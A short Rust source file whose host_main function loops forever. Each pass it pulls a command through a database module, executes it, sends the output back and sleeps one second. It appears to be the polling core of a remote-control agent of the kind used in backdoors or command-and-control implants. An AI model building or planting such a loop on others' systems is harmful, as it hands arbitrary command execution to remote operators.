use std::{thread, time};

use crate::command::exc;
use crate::db::get_command_thread::get_command;
use crate::db::send;

pub fn host_main() {
    loop {
        let data = get_command();
        let result = exc(data);
        send(&format!("**{}", result)).unwrap();
        thread::sleep(time::Duration::from_secs(1));
    }
}

